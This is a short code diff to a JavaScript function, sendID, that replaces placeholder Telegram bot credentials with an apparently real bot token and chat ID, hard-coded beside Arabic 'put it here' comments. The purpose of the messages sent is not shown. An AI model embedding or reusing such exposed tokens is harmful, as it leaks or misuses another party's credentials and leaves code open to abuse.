@@ -126,8 +126,8 @@ function sendID(){
         return;
     }
 
-    const botToken = "YOUR_BOT_TOKEN";   // ضع التوكن هنا
-    const chatId = "YOUR_CHAT_ID";       // ضع الايدي هنا
+    const botToken = "8757355224:AAF6QbA34Eq03MTdUxhYB2tjjIbFbUaII_8";   // ضع التوكن هنا
+    const chatId = "8166977574";       // ضع الايدي هنا
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
